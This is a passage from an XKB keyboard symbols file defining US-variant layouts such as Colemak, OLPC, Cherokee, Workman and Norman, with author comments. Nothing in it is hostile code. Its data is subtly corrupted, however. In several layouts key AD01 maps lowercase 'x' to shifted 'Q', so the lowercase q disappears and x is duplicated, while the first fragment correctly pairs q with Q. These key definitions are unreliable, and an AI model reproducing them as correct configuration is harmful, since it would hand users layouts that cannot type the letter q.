    key <AE08> { [	   8,   asterisk, enfilledcircbullet,      degree ] };
    key <AE09> { [	   9,  parenleft,   ordfeminine,   periodcentered ] };
    key <AE10> { [	   0, parenright,     masculine,singlelowquotemark] };
    key <AE11> { [     minus, underscore,        endash,           emdash ] };
    key <AE12> { [     equal,       plus,      notequal,        plusminus ] };

    key <AD01> { [	   q,          Q,            oe,               OE ] };
    key <AD02> { [	   w,          W,         U2211,doublelowquotemark] };
    key <AD03> { [	   e,          E,    dead_acute,            acute ] };
    key <AD04> { [	   r,          R,    registered,            U2030 ] };
    key <AD05> { [	   t,          T,        dagger,       dead_caron ] };
    key <AD06> { [	   y,          Y,           yen,       onequarter ] };
    key <AD07> { [	   u,        U,  dead_diaeresis,        diaeresis ] };
    key <AD08> { [	   i,        I, dead_circumflex,            U02C6 ] };
    key <AD09> { [	   o,          O,        oslash,         Ooblique ] };
    key <AD10> { [	   p,          P,      Greek_pi,            U220F ] };
    key <AD11> { [ bracketleft,  braceleft, leftdoublequotemark, rightdoublequotemark ] };
    key <AD12> { [bracketright, braceright, leftsinglequotemark, rightsinglequotemark ] };
    key <BKSL> { [ backslash,        bar, guillemotleft,   guillemotright ] };

    key <AC01> { [	   a,          A,         aring,            Aring ] };
    key <AC02> { [	   s,          S,        ssharp,      dead_stroke ] };
    key <AC03> { [	   d,          D, partialderivative,          eth ] };
    key <AC04> { [	   f,          F,      function,        dead_hook ] };
    key <AC05> { [	   g,          G,     copyright, dead_doubleacute ] };
    key <AC06> { [	   h,          H, dead_abovedot,    dead_belowdot ] };
    key <AC07> { [	   j,          J,         U2206,          onehalf ] };
    key <AC08> { [	   k,          K,dead_abovering,            UF8FF ] };

    key <AC09> { [	   l,          L,       notsign,            THORN ] };
    key <AC10> { [ semicolon,      colon,         U2026,            thorn ] };
    key <AC11> { [apostrophe,   quotedbl,            ae,               AE ] };

    key <AB01> { [	   z,          Z,   Greek_OMEGA,     dead_cedilla ] };
    key <AB02> { [	   x,          X,         U2248,      dead_ogonek ] };
				// unclear whether \"approxeq\" is 2248 or 2245
    key <AB03> { [	   c,          C,      ccedilla,         Ccedilla ] };
    key <AB04> { [	   v,          V,    squareroot,            U25CA ] };
    key <AB05> { [	   b,          B,      integral,         idotless ] };
    key <AB06> { [	   n,          N,    dead_tilde,            U02DC ] };
    key <AB07> { [	   m,          M,            mu,    threequarters ] };
    key <AB08> { [     comma,       less, lessthanequal,      dead_macron ] };
    key <AB09> { [    period,    greater, greaterthanequal,    dead_breve ] };
    key <AB10> { [     slash,   question,      division,     questiondown ] };

    include \"level3(ralt_switch)\"
};

// Colemak symbols for xkb on X.Org Server 7.x
// 2006-01-01 Shai Coleman, http://colemak.com/

partial alphanumeric_keys
xkb_symbols \"colemak\" {

    include \"us\"
    name[Group1]= \"English (Colemak)\";

    key <TLDE> { [        grave,   asciitilde,      dead_tilde,       asciitilde ] };
    key <AE01> { [            1,       exclam,      exclamdown,      onesuperior ] };
    key <AE02> { [            2,           at,       masculine,      twosuperior ] };
    key <AE03> { [            3,   numbersign,     ordfeminine,    threesuperior ] };
    key <AE04> { [            4,       dollar,            cent,         sterling ] };
    key <AE05> { [            5,      percent,        EuroSign,              yen ] };
    key <AE06> { [            6,  asciicircum,         hstroke,          Hstroke ] };
    key <AE07> { [            7,    ampersand,             eth,              ETH ] };
    key <AE08> { [            8,     asterisk,           thorn,            THORN ] };
    key <AE09> { [            9,    parenleft,  leftsinglequotemark,  leftdoublequotemark ] };
    key <AE10> { [            0,   parenright, rightsinglequotemark,  rightdoublequotemark ] };
    key <AE11> { [        minus,   underscore,          endash,           emdash ] };
    key <AE12> { [        equal,         plus,        multiply,         division ] };

    key <AD01> { [            x,            Q,      adiaeresis,       Adiaeresis ] };
    key <AD02> { [            w,            W,           aring,            Aring ] };
    key <AD03> { [            f,            F,          atilde,           Atilde ] };
    key <AD04> { [            p,            P,          oslash,         Ooblique ] };
    key <AD05> { [            g,            G,     dead_ogonek,       asciitilde ] };
    key <AD06> { [            j,            J,         dstroke,          Dstroke ] };
    key <AD07> { [            l,            L,         lstroke,          Lstroke ] };
    key <AD08> { [            u,            U,          uacute,           Uacute ] };
    key <AD09> { [            y,            Y,      udiaeresis,       Udiaeresis ] };
    key <AD10> { [    semicolon,        colon,      odiaeresis,       Odiaeresis ] };
    key <AD11> { [  bracketleft,    braceleft,   guillemotleft,        0x1002039 ] };
    key <AD12> { [ bracketright,   braceright,  guillemotright,        0x100203a ] };
    key <BKSL> { [    backslash,          bar,      asciitilde,       asciitilde ] };

    key <AC01> { [            a,            A,          aacute,           Aacute ] };
    key <AC02> { [            r,            R,      dead_grave,       asciitilde ] };
    key <AC03> { [            s,            S,          ssharp,       asciitilde ] };
    key <AC04> { [            t,            T,      dead_acute, dead_doubleacute ] };
    key <AC05> { [            d,            D,  dead_diaeresis,       asciitilde ] };
    key <AC06> { [            h,            H,      dead_caron,       asciitilde ] };
    key <AC07> { [            n,            N,          ntilde,           Ntilde ] };
    key <AC08> { [            e,            E,          eacute,           Eacute ] };
    key <AC09> { [            i,            I,          iacute,           Iacute ] };
    key <AC10> { [            o,            O,          oacute,           Oacute ] };
    key <AC11> { [   apostrophe,     quotedbl,          otilde,           Otilde ] };

    key <AB01> { [            z,            Z,              ae,               AE ] };
    key <AB02> { [            x,            X, dead_circumflex,       asciitilde ] };
    key <AB03> { [            c,            C,        ccedilla,         Ccedilla ] };
    key <AB04> { [            v,            V,              oe,               OE ] };
    key <AB05> { [            b,            B,      dead_breve,       asciitilde ] };
    key <AB06> { [            k,            K,  dead_abovering,       asciitilde ] };
    key <AB07> { [            m,            M,     dead_macron,       asciitilde ] };
    key <AB08> { [        comma,         less,    dead_cedilla,       asciitilde ] };
    key <AB09> { [       period,      greater,   dead_abovedot,       asciitilde ] };
    key <AB10> { [        slash,     question,    questiondown,       asciitilde ] };

    key <CAPS> { [    BackSpace,    BackSpace,       BackSpace,        BackSpace ] };
    key <LSGT> { [        minus,   underscore,          endash,           emdash ] };
    key <SPCE> { [        space,        space,           space,     nobreakspace ] };

    include \"level3(ralt_switch)\"
};

// I do NOT like dead-keys - the International keyboard as defined by Microsoft
// does not fit my needs. Why use two keystrokes for all simple characters (eg '
// and <space> generates a single ') just to have an é (eacute) in two strokes
// as well? I type ' more often than é (eacute).
//
// This file works just like a regular keyboard, BUT has all dead-keys
// accessible at level3 (through AltGr). An ë (ediaeresis) is now: AltGr+\"
// followed by an e. In other words, this keyboard is not international as long
// as you leave the right Alt key alone.
//
// The original MS International keyboard was intended for Latin1 (iso8859-1).
// With the introduction of iso8859-15, the (important) ligature oe (and OE)
// became available. I added them next to ae. Because I write ediaeresis more
// often than registered, I moved registered to be next to copyright and added
// ediaeresis and idiaeresis. - Adriaan

partial alphanumeric_keys
xkb_symbols \"altgr-intl\" {

   include \"us(intl)\"
   name[Group1]= \"English (intl., with AltGr dead keys)\";

// five dead keys moved into level3:

   key <TLDE> { [    grave, asciitilde,  dead_grave,   dead_tilde      ] };
   key <AC11> { [apostrophe,quotedbl,    dead_acute,   dead_diaeresis  ] };

// diversions from the MS Intl keyboard:

   key <AE01> { [        1, exclam,      onesuperior,  exclamdown      ] };
   key <AD04> { [        r, R,           ediaeresis,   Ediaeresis      ] };
   key <AC07> { [        j, J,           idiaeresis,   Idiaeresis      ] };
   key <AB02> { [        x, X,           oe,           OE              ] };
   key <AB04> { [        v, V,           registered,   registered      ] };

// onequarter etc (not in iso8859-15) moved to get three unshifted deadkeys:

   key <AE06> { [        6, asciicircum, dead_circumflex, onequarter    ] };
   key <AE07> { [        7, ampersand,   dead_horn,       onehalf       ] };
   key <AE08> { [        8, asterisk,    dead_ogonek,     threequarters ] };

   include \"level3(ralt_switch)\"
};

// Intel ClassmatePC Keyboard Layout
// by Piter PUNK <piterpk@terra.com.br>
//
// The keyboard layouts below maps the us(basic), us(intl) and us(alt-intl)
// to ClassmatePC keyboard. All layouts uses RCTL as level3(switch) since
// the keyboard does not have AltGr key. The EuroSign is engraved at 5 key.

// classmate - us(basic)
partial alphanumeric_keys
xkb_symbols \"classmate\" {
    include \"us(basic)\"
    name[Group1]= \"English (US)\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    include \"eurosign(5)\"
    include \"level3(switch)\"
};

// classmate-intl - us(intl)
// RCTL is generated by Fn+Alt, because that, when trying to access
// the level3 symbols at 7,8,9,0,u,i,o,p,j,k,l,;,m,. and / we got
// the keypad keycodes. The keypad is changed to make Fn+Alt+<KP_key>
// generate the same symbol as the original key.
partial alphanumeric_keys
xkb_symbols \"classmate-intl\" {
    include \"us(intl)\"
    name[Group1]= \"USA - ClassmatePC (International)\";
    key.type[Group1]=\"FOUR_LEVEL\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    key <KP7>  { [	KP_Home,		KP_7,	
			onehalf,		dead_horn	] };
    key <KP8>  { [	KP_Up,			KP_8,
			threequarters,		dead_ogonek	] };
    key <KP9>  { [	KP_Prior,		KP_9,
			leftsinglequotemark,	dead_breve	] };
    key <KPMU> { [ 	KP_Multiply,		KP_Multiply,
			rightsinglequotemark,	dead_abovering	] };

    key <KP4>  { [	KP_Left,		KP_4,
			uacute,			Uacute		] };
    key <KP5>  { [	KP_Begin,		KP_5,
			iacute,			Iacute		] };
    key <KP6>  { [	KP_Right,		KP_6,
			oacute,			Oacute		] };
    key <KPSU> { [	KP_Subtract,		KP_Subtract,
			odiaeresis,		Odiaeresis	] };

    key <KP2>  { [	KP_Down,		KP_2,
			oe,			OE		] };
    key <KP3>  { [	KP_Next,		KP_3,
			oslash,			Ooblique	] };
    key <KPAD> { [ 	KP_Add,     		KP_Add,
			paragraph,		degree          ] };

    key <KP0>  { [	KP_Insert,		KP_0,
			mu,			mu	] };
    key <KPDL> { [	KP_Delete,		KP_Decimal,
			dead_abovedot,		dead_caron	] };
    key <KPDV> { [ 	KP_Divide,   		KP_Divide,
			questiondown,		dead_hook       ] };

    include \"level3(switch)\"
};

// classmate-alt-intl - us(alt-intl)
// RCTL is generated by Fn+Alt, because that, when trying to access
// the level3 symbols at 7,8,9,0,u,i,o,p,j,k,l,;,m,. and / we got
// the keypad keycodes. The keypad is changed to make Fn+Alt+<KP_key>
// generate the same symbol as the original key.
partial alphanumeric_keys
xkb_symbols \"classmate-alt-intl\" {
    include \"us(alt-intl)\"
    name[Group1]= \"USA - ClassmatePC (Alternative international)\";
    key.type[Group1]=\"FOUR_LEVEL\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    key <KPSU> { [	KP_Subtract,		KP_Subtract	] };

    key <KP9>  { [	KP_Prior,		KP_9,
			leftsinglequotemark,	dead_breve	] };
    key <KPMU> { [ 	KP_Multiply,		KP_Multiply,
			rightsinglequotemark,	dead_abovering	] };

    key <KPAD> { [ 	KP_Add,     		KP_Add,
			dead_ogonek,		dead_diaeresis   ] };

    key <KPDL> { [	KP_Delete,		KP_Decimal,
			dead_abovedot,		dead_circumflex	] };
    key <KPDV> { [ 	KP_Divide,   		KP_Divide,
			dead_hook,		dead_hook       ] };

    include \"level3(switch)\"
};

// classmate-altgr-intl - us(altgr-intl)
// RCTL is generated by Fn+Alt, because that, when trying to access
// the level3 symbols at 7,8,9,0,u,i,o,p,j,k,l,;,m,. and / we got
// the keypad keycodes. The keypad is changed to make Fn+Alt+<KP_key>
// generate the same symbol as the original key.
partial alphanumeric_keys
xkb_symbols \"classmate-altgr-intl\" {
    include \"us(altgr-intl)\"
    name[Group1]= \"USA - ClassmatePC (International Fn+Alt dead-keys)\";
    key.type[Group1]=\"FOUR_LEVEL\";

    key <LSGT> { [ backslash,	bar,		backslash,	bar ] };

    key <KP7>  { [	KP_Home,		KP_7,	
			dead_horn,		dead_horn	] };
    key <KP8>  { [	KP_Up,			KP_8,
			dead_ogonek,		dead_ogonek	] };
    key <KP9>  { [	KP_Prior,		KP_9,
			leftsinglequotemark,	dead_breve	] };
    key <KPMU> { [ 	KP_Multiply,		KP_Multiply,
			rightsinglequotemark,	dead_abovering	] };

    key <KP4>  { [	KP_Left,		KP_4,
			uacute,			Uacute		] };
    key <KP5>  { [	KP_Begin,		KP_5,
			iacute,			Iacute		] };
    key <KP6>  { [	KP_Right,		KP_6,
			oacute,			Oacute		] };
    key <KPSU> { [	KP_Subtract,		KP_Subtract,
			odiaeresis,		Odiaeresis	] };

    key <KP1>  { [	KP_End,			KP_1,
			idiaeresis,		Idiaeresis	] };
    key <KP2>  { [	KP_Down,		KP_2,
			oe,			OE		] };
    key <KP3>  { [	KP_Next,		KP_3,
			oslash,			Ooblique	] };
    key <KPAD> { [ 	KP_Add,     		KP_Add,
			paragraph,		degree          ] };

    key <KP0>  { [	KP_Insert,		KP_0,
			mu,			mu	] };
    key <KPDL> { [	KP_Delete,		KP_Decimal,
			dead_abovedot,		dead_caron	] };
    key <KPDV> { [ 	KP_Divide,   		KP_Divide,
			questiondown,		dead_hook       ] };

    include \"level3(switch)\"
};

partial alphanumeric_keys
xkb_symbols \"olpc\" {

   include \"us(basic)\"
   name[Group1]= \"English (US)\";

   // OLPC international US English keyboard layout.
   // It's a little different from the usual international layout.
   // See: http://wiki.laptop.org/go/Image:Keyboard_english.png

   key <TLDE> { [     grave, asciitilde,    dead_grave, dead_tilde ] };
   key <AE01> { [         1,     exclam,    exclamdown, exclamdown ] };
   key <AE02> { [         2,         at,       notsign,    notsign ] };
   key <AE03> { [         3, numbersign,     0x1000300,  0x1000300 ] }; // combining grave
   key <AE04> { [         4,     dollar,     0x1000301,  0x1000301 ] }; // combining acute
   key <AE05> { [         5,    percent,     0x1000306,  0x1000306 ] }; // combining breve above
   key <AE06> { [         6,asciicircum,     0x100030A,  0x100030A ] }; // combining ring above
   key <AE07> { [         7,  ampersand,     0x1000302,  0x1000302 ] }; // combining circumflex above
   key <AE08> { [         8,   asterisk,     0x100030C,  0x100030C ] }; // combining caron above
   key <AE09> { [         9,  parenleft,     0x1000307,  0x1000307 ] }; // combining dot above
   key <AE10> { [         0, parenright,     0x1000308,  0x1000308 ] }; // combining diaeresis above
   key <AE11> { [     minus, underscore,     0x1000304,  0x1000304 ] }; // combining macron above
   key <AE12> { [     equal,       plus,     0x1000303,  0x1000303 ] }; // combining tilde above

   key <AD01> { [         x,          Q,  Greek_omega, Greek_OMEGA ] };
   key <AD02> { [         w,          W,       oslash,      Oslash ] };
   key <AD03> { [         e,          E,           oe,          OE ] };
   key <AD04> { [         r,          R,    0x1000327,   0x1000327 ] }; // combining cedilla
   key <AD05> { [         t,          T,    0x100032E,   0x100032E ] }; // combining breve below
   key <AD06> { [         y,          Y,    0x1000325,   0x1000325 ] }; // combining ring below
   key <AD07> { [         u,          U,    0x100032D,   0x100032D ] }; // combining circumflex below
   key <AD08> { [         i,          I,    0x100032C,   0x100032C ] }; // combining caron below
   key <AD09> { [         o,          O,    0x1000323,   0x1000323 ] }; // combining dot below
   key <AD10> { [         p,          P,    0x1000324,   0x1000324 ] }; // combining diaeresis below
   key <AD11> { [ bracketleft,  braceleft,  0x1000331,   0x1000331 ] }; // combining macron below
   key <AD12> { [bracketright, braceright,  0x1000330,   0x1000330 ] }; // combining tilde below

   key <AC01>  { [         a,          A,          ae,               AE ] };
   key <AC02>  { [         s,          S,      ssharp,        0x1001E9C ] }; // uppercase S sharp
   key <AC03>  { [         d,          D,         eth,              ETH ] };
   key <AC04>  { [         f,          F,       thorn,            THORN ] };
   key <AC06>  { [         h,          H,    sterling,         sterling ] };
   key <AC07>  { [         j,          J,    EuroSign,         EuroSign ] };
   key <AC10>  { [ semicolon,      colon,   masculine,      ordfeminine ] };
   key <AC11>  { [ apostrophe,  quotedbl,    currency,         currency ] };
   key <AC12>  { [ backslash,        bar,      section,         section ] };

   key <AB03>  { [         c,          C,    ccedilla,         Ccedilla ] };
   key <AB06>  { [         n,          N,      ntilde,           Ntilde ] };
   key <AB07>  { [         m,          M,          mu,               mu ] };
   key <AB08>  { [     comma,     less,  guillemotleft,   guillemotleft ] };
   key <AB09>  { [    period,  greater, guillemotright,  guillemotright ] };
   key <AB10>  { [     slash,   question, questiondown,    questiondown ] };

   key <I219>  { [  multiply,   division, ISO_Next_Group, ISO_Prev_Group ] };

   include \"level3(ralt_switch)\"
};

partial alphanumeric_keys
xkb_symbols \"olpc2\" {
   include \"us(olpc)\"
   name[Group1]= \"English (the divide/multiply keys toggle the layout)\";
   include \"group(olpc)\"
};

xkb_symbols \"olpcm\" {

   include \"us(basic)\"
   name[Group1]= \"English (US)\";

   // Mechanical (non-membrane) OLPC int'l US English keyboard layout.
   // See: http://wiki.laptop.org/go/OLPC_English_Non-membrane_Keyboard

   key <TLDE> { [     grave, asciitilde,    dead_grave, dead_tilde ] };
   key <AE01> { [         1,     exclam,    exclamdown, exclamdown ] };
   key <AE02> { [         2,         at,       notsign,    notsign ] };
   key <AE03> { [         3, numbersign,     0x1000300,  0x1000300 ] }; // combining grave
   key <AE04> { [         4,     dollar,     0x1000301,  0x1000301 ] }; // combining acute
   key <AE05> { [         5,    percent,     0x1000306,  0x1000306 ] }; // combining breve above
   key <AE06> { [         6,asciicircum,     0x100030A,  0x100030A ] }; // combining ring above
   key <AE07> { [         7,  ampersand,     0x1000302,  0x1000302 ] }; // combining circumflex above
   key <AE08> { [         8,   asterisk,     0x100030C,  0x100030C ] }; // combining caron above
   key <AE09> { [         9,  parenleft,     0x1000307,  0x1000307 ] }; // combining dot above
   key <AE10> { [         0, parenright,     0x1000308,  0x1000308 ] }; // combining diaeresis above
   key <AE11> { [     minus, underscore,     0x1000304,  0x1000304 ] }; // combining macron above

   key <AD01> { [         x,          Q,  Greek_omega, Greek_OMEGA ] };
   key <AD02> { [         w,          W,       oslash,      Oslash ] };
   key <AD03> { [         e,          E,           oe,          OE ] };
   key <AD04> { [         r,          R,    0x1000327,   0x1000327 ] }; // combining cedilla
   key <AD05> { [         t,          T,    0x100032E,   0x100032E ] }; // combining breve below
   key <AD06> { [         y,          Y,    0x1000325,   0x1000325 ] }; // combining ring below
   key <AD07> { [         u,          U,    0x100032D,   0x100032D ] }; // combining circumflex below
   key <AD08> { [         i,          I,    0x100032C,   0x100032C ] }; // combining caron below
   key <AD09> { [         o,          O,    0x1000323,   0x1000323 ] }; // combining dot below
   key <AD10> { [         p,          P,    0x1000324,   0x1000324 ] }; // combining diaeresis below
   key <AD11> { [ bracketleft,  braceleft,  0x1000331,   0x1000331 ] }; // combining macron below
   key <AD12> { [bracketright, braceright,  0x1000330,   0x1000330 ] }; // combining tilde below

   key <AC01>  { [         a,          A,          ae,               AE ] };
   key <AC02>  { [         s,          S,      ssharp,        0x1001E9C ] }; // uppercase S sharp
   key <AC03>  { [         d,          D,         eth,              ETH ] };
   key <AC04>  { [         f,          F,       thorn,            THORN ] };
   key <AC06>  { [         h,          H,    sterling,         sterling ] };
   key <AC07>  { [         j,          J,    EuroSign,         EuroSign ] };
   key <AC10>  { [ semicolon,      colon,   masculine,      ordfeminine ] };
   // no AC11 or AC12 on olpcm

   key <AB03>  { [         c,          C,    ccedilla,         Ccedilla ] };
   key <AB06>  { [         n,          N,      ntilde,           Ntilde ] };
   key <AB07>  { [         m,          M,          mu,               mu ] };
   key <AB08>  { [     comma,     less,  guillemotleft,   guillemotleft ] };
   key <AB09>  { [    period,  greater, guillemotright,  guillemotright ] };
   key <AB10>  { [     slash,   question, questiondown,    questiondown ] };

   key <AA02>  { [ backslash,        bar,      section,         section ] };
   key <AA06>  { [     equal,       plus,     0x1000303,  0x1000303 ] };
   key <AA07>  { [ apostrophe,  quotedbl,    currency,         currency ] };

   include \"level3(ralt_switch)\"
};

// Based on Cherokee Nation Official Layout
// http://www.cherokee.org/extras/downloads/font/Keyboard.htm

partial alphanumeric_keys modifier_keys
xkb_symbols \"chr\" {

    name[Group1]= \"Cherokee\";
    key.type[group1]=\"ALPHABETIC\";

    key <TLDE> { [      grave,      U13CA ] };
    key <AE01> { [          1,      U13B1 ] };
    key <AE02> { [          2,      U13C7 ] };
    key <AE03> { [          3,      U13E7 ] };
    key <AE04> { [      U13D9,      U13B0 ] };
    key <AE05> { [      U13E6,      U13B9 ] };
    key <AE06> { [      U13DC,      U13DD ] };
    key <AE07> { [      U13CB,      U13E1 ] };
    key <AE08> { [      U13D6,      U13BA ] };
    key <AE09> { [      U13D2,  parenleft ] };
    key <AE10> { [      U13C4, parenright ] };
    key <AE11> { [      U13BF,      U13BC ] };
    key <AE12> { [      U13F3,      U13BD ] };

    key <AD01> { [      U13AA,      U13C6 ] };
    key <AD02> { [      U13B3,      U13EB ] };
    key <AD03> { [      U13A1,      U13E3 ] };
    key <AD04> { [      U13DB,      U13CF ] };
    key <AD05> { [      U13D4,      U13D8 ] };
    key <AD06> { [      U13EF,      U13F2 ] };
    key <AD07> { [      U13A4,      U13AD ] };
    key <AD08> { [      U13A2,      U13F1 ] };
    key <AD09> { [      U13A3,      U13EC ] };
    key <AD10> { [      U13C1,      U13EA ] };
    key <AD11> { [      U13D5,      U13D1 ] };
    key <AD12> { [      U13B6,      U13E4 ] };
    key <BKSL> { [      U13E9,      U13EE ] };

    key <AC01> { [      U13A0,      U13CC ] };
    key <AC02> { [      U13CD,      U13CE ] };
    key <AC03> { [      U13D7,      U13D0 ] };
    key <AC04> { [      U13A9,      U13C8 ] };
    key <AC05> { [      U13A6,      U13E5 ] };
    key <AC06> { [      U13AF,      U13B2 ] };
    key <AC07> { [      U13DA,      U13AB ] };
    key <AC08> { [      U13B8,      U13A7 ] };
    key <AC09> { [      U13B5,      U13AE ] };
    key <AC10> { [      U13E8,      U13E0 ] };
    key <AC11> { [ apostrophe,   quotedbl ] };

    key <AB01> { [      U13AC,      U13C3 ] };
    key <AB02> { [      U13F4,      U13ED ] };
    key <AB03> { [      U13D3,      U13DF ] };
    key <AB04> { [      U13A5,      U13DE ] };
    key <AB05> { [      U13A8,      U13F0 ] };
    key <AB06> { [      U13BE,      U13BB ] };
    key <AB07> { [      U13C5,      U13B7 ] };
    key <AB08> { [      comma,      U13E2 ] };
    key <AB09> { [     period,      U13B4 ] };
    key <AB10> { [      U13C2,      U13C9 ] };
};

// Serbian charecters added as third level symbols to US keyboard layout.

partial alphanumeric_keys
xkb_symbols \"hbs\" {

  include \"us\"
  name[Group1]= \"Serbo-Croatian (US)\";

  key <TLDE> { [ grave, asciitilde ] };
  key <AE06> { [ 6, dead_caron, asciicircum, asciicircum ] };
  key <AE08> { [ 8, asterisk, multiply, division ] };
  key <AE11> { [ minus, underscore, endash, emdash ] };
  key <AC09> { [ l, L, U1C9, U1C8 ] };
  key <AB06> { [ n, N, U1CC, U1CB ] };
  key <AB01> { [ z, Z, U1C6, U1C5 ] };
  key <AD03> { [ e, E, EuroSign, cent ] };
  key <AC03> { [ d, D, dstroke, Dstroke ] };
  key <AC11> { [ dead_acute, quotedbl, apostrophe, apostrophe ] };
  key <SPCE> { [ space, space, nobreakspace, nobreakspace ] };
  key <AB08> { [ comma, less, U3003, guillemotright ] };
  key <AB09> { [ period, greater, ellipsis, guillemotleft ] };

  include \"level3(ralt_switch)\"
};

//based on http://upload.wikimedia.org/wikipedia/commons/1/18/T-Mobile_G1_launch_event_2.jpg
partial alphanumeric_keys
xkb_symbols \"htcdream\" {
        include \"inet(htcdream)\"
        name[Group1]= \"English (US)\";

        //second row
        key <AD01> { [ x, Q, Tab, Tab ] };
        key <AD02> { [ w, W, grave, grave ] };
        key <AD03> { [ e, E, underscore, underscore ] };
        key <AD04> { [ r, R, sterling, sterling ] };
        key <AD05> { [ t, T, EuroSign, EuroSign ] };
        key <AD06> { [ y, Y, division, division ] };
        key <AD07> { [ u, U, multiply, multiply ] };
        key <AD08> { [ i, I, minus, minus ] };
        key <AD09> { [ o, O, plus, plus ] };
        key <AD10> { [ p, P, equal, equal ] };

        //third row
        key <AC01> { [ a, A, NoSymbol, NoSymbol ] };
        key <AC02> { [ s, S, bar, bar ] };
        key <AC03> { [ d ,D, backslash, backslash ] };
        key <AC04> { [ f, F, braceleft, braceleft ] };
        key <AC05> { [ g, G, braceright, braceright ] };
        key <AC06> { [ h, H, colon, colon ] };
        key <AC07> { [ j, J, semicolon, semicolon ] };
        key <AC08> { [ k, K, quotedbl, quotedbl ] };
        key <AC09> { [ l, L, apostrophe, apostrophe ] };

        //forth row
        key <AB01> { [ z, Z, NoSymbol, NoSymbol ] };
        key <AB02> { [ x, X, NoSymbol, NoSymbol ] };
        key <AB03> { [ c, C, NoSymbol, NoSymbol ] };
        key <AB04> { [ v, V, bracketleft, bracketleft ] };
        key <AB05> { [ b, B, bracketright, bracketright ] };
        key <AB06> { [ n, N, less, less ] };
        key <AB07> { [ m, M, greater, greater ] };
        key <AB08> { [ comma, comma, question, question ] };

        //fifth row
        key <FK15> { [ at, at, asciitilde, asciitilde ] };

        include \"level3(alt_switch)\"
};

// Workman Keyboard Layout symbols for xkb on X.Org Server 7.x
// 09-06-2010 OJ Bucao. http://www.workmanlayout.com

partial alphanumeric_keys
xkb_symbols \"workman\" {

    include \"us(basic)\"
    name[Group1]= \"English (Workman)\";

    key <AD01> {  [   x,  Q   ] };
    key <AD02> {  [   d,  D   ] };
    key <AD03> {  [   r,  R   ] };
    key <AD04> {  [   w,  W   ] };
    key <AD05> {  [   b,  B   ] };
    key <AD06> {  [   j,  J   ] };
    key <AD07> {  [   f,  F   ] };
    key <AD08> {  [   u,  U   ] };
    key <AD09> {  [   p,  P   ] };
    key <AD10> {  [   semicolon,  colon   ] };

    key <AC01> {  [   a,  A   ] };
    key <AC02> {  [   s,  S   ] };
    key <AC03> {  [   h,  H   ] };
    key <AC04> {  [   t,  T   ] };
    key <AC05> {  [   g,  G   ] };
    key <AC06> {  [   y,  Y   ] };
    key <AC07> {  [   n,  N   ] };
    key <AC08> {  [   e,  E   ] };
    key <AC09> {  [   o,  O   ] };
    key <AC10> {  [   i,  I   ] };

    key <AB01> {  [   z,  Z   ] };
    key <AB02> {  [   x,  X   ] };
    key <AB03> {  [   m,  M   ] };
    key <AB04> {  [   c,  C   ] };
    key <AB05> {  [   v,  V   ] };
    key <AB06> {  [   k,  K   ] };
    key <AB07> {  [   l,  L   ] };

    key <CAPS> { [    BackSpace,       Escape,       BackSpace,        BackSpace ] };

    include \"level3(ralt_switch)\"
};

partial alphanumeric_keys
xkb_symbols \"workman-intl\" {

    include \"us(intl)\"
    name[Group1]= \"English (Workman, intl., with dead keys)\";

    key <AD01> { [     x,          Q,    adiaeresis,       Adiaeresis ] };
    key <AD02> { [     d,          D,           eth,              ETH ] };
    key <AD03> { [     r,          R,    registered,       registered ] };
    key <AD04> { [     w,          W,         aring,            Aring ] };
    key <AD05> { [     b,          B,             b,                B ] };
    key <AD06> { [     j,          J,             j,                J ] };
    key <AD07> { [     f,          F,             f,                F ] };
    key <AD08> { [     u,          U,        uacute,           Uacute ] };
    key <AD09> { [     p,          P,    odiaeresis,       Odiaeresis ] };
    key <AD10> { [ semicolon,  colon,     paragraph,           degree ] };

    key <AC01> { [     a,          A,        aacute,           Aacute ] };
    key <AC02> { [     s,          S,        ssharp,          section ] };
    key <AC03> { [     h,          H,             h,                H ] };
    key <AC04> { [     t,          T,         thorn,            THORN ] };
    key <AC05> { [     g,          G,             g,                G ] };
    key <AC06> { [     y,          Y,    udiaeresis,       Udiaeresis ] };
    key <AC07> { [     n,          N,        ntilde,           Ntilde ] };
    key <AC08> { [     e,          E,        eacute,           Eacute ] };
    key <AC09> { [     o,          O,        oacute,           Oacute ] };
    key <AC10> { [     i,          I,        iacute,           Iacute ] };

    key <AB01> { [     z,          Z,            ae,               AE ] };
    key <AB02> { [     x,          X,             x,                X ] };
    key <AB03> { [     m,          M,            mu,               mu ] };
    key <AB04> { [     c,          C,     copyright,             cent ] };
    key <AB05> { [     v,          V,             v,                V ] };
    key <AB06> { [     k,          K,            oe,               OE ] };
    key <AB07> { [     l,          L,        oslash,         Ooblique ] };

    key <CAPS> { [ BackSpace, Escape,     BackSpace,        BackSpace ] };

    include \"level3(ralt_switch)\"
};

// Norman keyboard layout symbols for xkb on X.Org Server 7.x
// Written 11/23/2012, revised 3/7/2013 by David Norman http://normanlayout.info
// To the extent possible under law, the author(s) have dedicated all
// copyright and related and neighboring rights to this software to the
// public domain worldwide. This software is distributed without any warranty.

partial alphanumeric_keys
xkb_symbols \"norman\" {

    include \"us(basic)\"
    name[Group1]= \"English (Norman)\";

    key <AD01> { [ x, Q ] };
    key <AD02> { [ w, W ] };
    key <AD03> { [ d, D ] };
    key <AD04> { [ f, F ] };
    key <AD05> { [ k, K ] };
    key <AD06> { [ j, J ] };
    key <AD07> { [ u, U ] };
    key <AD08> { [ r, R ] };
    key <AD09> { [ l, L ] };
    key <AD10> { [ semicolon, colon ] };

    key <AC01> { [ a, A ] };
    key <AC02> { [ s, S ] };
    key <AC03> { [ e, E ] };
    key <AC04> { [ t, T ] };
    key <AC05> { [ g, G ] };
    key <AC06> { [ y, Y ] };
    key <AC07> { [ n, N ] };
    key <AC08> { [ i, I ] };
    key <AC09> { [ o, O ] };
    key <AC10> { [ h, H ] };

    key <AB01> { [ z, Z ] };
    key <AB02> { [ x, X ] };
    key <AB03> { [ c, C ] };
    key <AB04> { [ v, V ] };
    key <AB05> { [ b, B ] };
    key <AB06> { [ p, P ] };
    key <AB07> { [ m, M ] };

    key <CAPS> { [ BackSpace ] };

    include \"level3(ralt_switch)\"
};

// Carpalx layout created by Martin Krzywinski
// http://mkweb.bcgsc.ca/carpalx/

partial alphanumeric_keys
xkb_symbols \"carpalx\" {

    name[Group1]= \"English (Carpalx)\";

    key <TLDE> {	[     grave,	asciitilde	]	};
    key <AE01> {	[	  1,	exclam 		]	};
    key <AE02> {	[	  2,	at		]	};
